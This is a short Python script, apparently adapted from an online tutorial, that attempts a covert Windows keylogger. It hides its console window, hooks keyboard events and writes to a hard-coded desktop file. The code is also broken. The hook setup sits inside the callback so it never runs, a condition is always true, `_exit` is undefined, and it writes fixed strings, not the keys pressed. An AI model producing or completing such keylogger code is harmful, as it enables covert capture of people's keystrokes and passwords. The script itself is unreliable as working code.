#not mine, source: https://www.geeksforgeeks.org/design-a-keylogger-in-python/
import win32api
import win32console
import win32gui
import pythoncom, pyHook
import sys
win=win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)
def OnKeyboardEvent(event):
	if event.Ascii==5:
		_exit(1)
	if event.Ascii !=0 or 8:
		f=open(r'C:\Users\tdwil\OneDrive\Desktop\testing.txt', 'r+')
		buffer=f.read()
		f.close()
		f=open(r'C:\Users\tdwil\OneDrive\Desktop\testing.txt', 'w')
		keylogs='/n'
		buffer+=keylogs
		f.write("keyloggin")
		f.write(buffer)
		f.close()
	#hook manager object
	hm=pyHook.HookManager()
	hm.KeyDown=OnKeyboardEvent
	#set the hook
	hm.HookKeyboard()
	#wait
	pythoncom.PumpMessages()
		